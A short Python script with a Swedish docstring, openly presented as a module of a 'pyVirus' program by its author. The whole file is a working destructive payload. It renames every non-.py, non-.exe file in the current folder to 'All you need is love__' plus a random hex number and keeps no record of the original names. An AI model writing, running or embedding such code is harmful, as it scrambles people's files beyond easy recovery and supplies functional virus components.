#!/usr/bin/env python
"""
pyVirus_modul2.py av Stefan Blecko. Version 0.1 2021

Detta är en modul till pyVirus.py skriptet. pyVirus_modul2.py kommer sammanfogas med
pyVirus.py vid ett senare tillfälle. Skriptet ändrar filnamnet på alla filer
(förutom på .py, .exe samt mappar) till "All you need is love__" + ett hexadecimalt
tal mellan 11111 och 99999. Filändelsen ändras inte.
"""

from pathlib import Path
import time
import random


def new_name():
    return f"All you need is love__{str(hex(random.randrange(11111, 99999)))}"

def main():
    p = Path(".")
    for item in p.iterdir():
        if item.suffix == ".py" or item.suffix == ".exe":
            pass
        elif item.is_dir():
            pass
        else:
            item.rename(f"{new_name()}" + f"{item.suffix}")
    print("Klart!")
    time.sleep(5)

if __name__ == "__main__":
    main()
